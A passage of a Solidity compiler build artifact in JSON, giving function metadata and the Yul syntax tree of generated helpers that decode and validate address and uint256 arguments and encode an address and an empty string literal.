									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 790,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_address": {
									"entryPoint": 542,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint160": {
									"entryPoint": 510,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 649,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db": {
									"entryPoint": null,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b": {
									"entryPoint": 505,
									"id": null,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470": {
									"entryPoint": 801,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_address": {
									"entryPoint": 560,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								},
								"validator_revert_t_uint256": {
									"entryPoint": 659,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:3278:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "47:35:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "57:19:1",
															"value": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "73:2:1",
																		"type": "",
																		"value": "64"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "67:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "67:9:1"
															},
															"variableNames": [
																{
																	"name": "memPtr",
																	"nodeType": "YulIdentifier",
																	"src": "57:6:1"
																}
															]
														}
													]
												},
												"name": "allocate_unbounded",
												"nodeType": "YulFunctionDefinition",
												"returnVariables": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "40:6:1",
														"type": ""
													}
												],
												"src": "7:75:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "177:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "194:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "197:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "187:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "187:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "187:12:1"
														}
													]
												},
												"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
												"nodeType": "YulFunctionDefinition",
												"src": "88:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "300:28:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "317:1:1",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "320:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "310:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "310:12:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "310:12:1"
														}
													]
												},
												"name": "revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db",
												"nodeType": "YulFunctionDefinition",
												"src": "211:117:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "379:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "389:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "404:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "411:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "400:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "400:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "389:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "361:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "371:7:1",
														"type": ""
													}
												],
												"src": "334:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "511:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "521:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "550:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "532:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "532:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "521:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "493:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "503:7:1",
														"type": ""
													}
												],
												"src": "466:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "611:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "668:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "677:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "680:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "670:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "670:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "670:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "634:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "659:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_address",
																					"nodeType": "YulIdentifier",
																					"src": "641:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "641:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "631:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "631:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "624:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "624:43:1"
															},
															"nodeType": "YulIf",
															"src": "621:63:1"
														}
													]
												},
												"name": "validator_revert_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "604:5:1",
														"type": ""
													}
												],
												"src": "568:122:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "748:87:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "758:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "780:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "767:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "767:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "758:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "823:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_address",
																	"nodeType": "YulIdentifier",
																	"src": "796:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "796:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "796:33:1"
														}
													]
												},
												"name": "abi_decode_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "726:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "734:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "742:5:1",
														"type": ""
													}
												],
												"src": "696:139:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "907:263:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "953:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "955:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "955:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "955:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "928:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "937:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "924:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "924:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "949:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "920:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "920:32:1"
															},
															"nodeType": "YulIf",
															"src": "917:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "1046:117:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1061:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1075:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1065:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1090:63:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1125:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1136:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1121:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1121:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1145:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "1100:20:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1100:53:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1090:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "877:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "888:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "900:6:1",
														"type": ""
													}
												],
												"src": "841:329:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1221:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1231:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "1242:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1231:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1203:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1213:7:1",
														"type": ""
													}
												],
												"src": "1176:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1302:79:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1359:16:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1368:1:1",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "1371:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "1361:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1361:12:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1361:12:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1325:5:1"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "1350:5:1"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_uint256",
																					"nodeType": "YulIdentifier",
																					"src": "1332:17:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1332:24:1"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "1322:2:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1322:35:1"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "1315:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1315:43:1"
															},
															"nodeType": "YulIf",
															"src": "1312:63:1"
														}
													]
												},
												"name": "validator_revert_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1295:5:1",
														"type": ""
													}
												],
												"src": "1259:122:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1439:87:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1449:29:1",
															"value": {
																"arguments": [
																	{
																		"name": "offset",
																		"nodeType": "YulIdentifier",
																		"src": "1471:6:1"
																	}
																],
																"functionName": {
																	"name": "calldataload",
																	"nodeType": "YulIdentifier",
																	"src": "1458:12:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1458:20:1"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "1449:5:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1514:5:1"
																	}
																],
																"functionName": {
																	"name": "validator_revert_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "1487:26:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1487:33:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1487:33:1"
														}
													]
												},
												"name": "abi_decode_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "offset",
														"nodeType": "YulTypedName",
														"src": "1417:6:1",
														"type": ""
													},
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1425:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1433:5:1",
														"type": ""
													}
												],
												"src": "1387:139:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1598:263:1",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "1644:83:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b",
																				"nodeType": "YulIdentifier",
																				"src": "1646:77:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1646:79:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "1646:79:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1619:7:1"
																			},
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1628:9:1"
																			}
																		],
																		"functionName": {
																			"name": "sub",
																			"nodeType": "YulIdentifier",
																			"src": "1615:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1615:23:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1640:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "slt",
																	"nodeType": "YulIdentifier",
																	"src": "1611:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1611:32:1"
															},
															"nodeType": "YulIf",
															"src": "1608:119:1"
														},
														{
															"nodeType": "YulBlock",
															"src": "1737:117:1",
															"statements": [
																{
																	"nodeType": "YulVariableDeclaration",
																	"src": "1752:15:1",
																	"value": {
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1766:1:1",
																		"type": "",
																		"value": "0"
																	},
																	"variables": [
																		{
																			"name": "offset",
																			"nodeType": "YulTypedName",
																			"src": "1756:6:1",
																			"type": ""
																		}
																	]
																},
																{
																	"nodeType": "YulAssignment",
																	"src": "1781:63:1",
																	"value": {
																		"arguments": [
																			{
																				"arguments": [
																					{
																						"name": "headStart",
																						"nodeType": "YulIdentifier",
																						"src": "1816:9:1"
																					},
																					{
																						"name": "offset",
																						"nodeType": "YulIdentifier",
																						"src": "1827:6:1"
																					}
																				],
																				"functionName": {
																					"name": "add",
																					"nodeType": "YulIdentifier",
																					"src": "1812:3:1"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "1812:22:1"
																			},
																			{
																				"name": "dataEnd",
																				"nodeType": "YulIdentifier",
																				"src": "1836:7:1"
																			}
																		],
																		"functionName": {
																			"name": "abi_decode_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "1791:20:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1791:53:1"
																	},
																	"variableNames": [
																		{
																			"name": "value0",
																			"nodeType": "YulIdentifier",
																			"src": "1781:6:1"
																		}
																	]
																}
															]
														}
													]
												},
												"name": "abi_decode_tuple_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1568:9:1",
														"type": ""
													},
													{
														"name": "dataEnd",
														"nodeType": "YulTypedName",
														"src": "1579:7:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1591:6:1",
														"type": ""
													}
												],
												"src": "1532:329:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1932:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1949:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1972:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "1954:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1954:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1942:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1942:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1942:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1920:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1927:3:1",
														"type": ""
													}
												],
												"src": "1867:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2089:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2099:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "2111:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2122:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2107:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2107:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "2099:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "2179:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "2192:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "2203:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "2188:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2188:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2135:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2135:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2135:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "2061:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "2073:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "2084:4:1",
														"type": ""
													}
												],
												"src": "1991:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2332:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2342:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "2357:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "2342:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2304:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "2309:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "2320:11:1",
														"type": ""
													}
												],
												"src": "2219:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2478:8:1",
													"statements": []
												},
												"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "memPtr",
														"nodeType": "YulTypedName",
														"src": "2470:6:1",
														"type": ""
													}
												],
												"src": "2372:114:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2655:235:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2665:90:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2748:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2753:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "2672:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2672:83:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "2665:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2853:3:1"
																	}
																],
																"functionName": {
																	"name": "store_literal_in_memory_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470",
																	"nodeType": "YulIdentifier",
																	"src": "2764:88:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2764:93:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2764:93:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2866:18:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "2877:3:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2882:1:1",
																		"type": "",
																		"value": "0"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2873:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "2873:11:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "2866:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "2643:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "2651:3:1",
														"type": ""
													}
												],
												"src": "2492:398:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "3084:191:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "3095:154:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "3245:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "3102:141:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "3102:147:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "3095:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "3259:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "3266:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "3259:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_stringliteral_c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "3071:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "3080:3:1",
														"type": ""
													}
												],
												"src": "2896:379:1"
											}
										]
									},
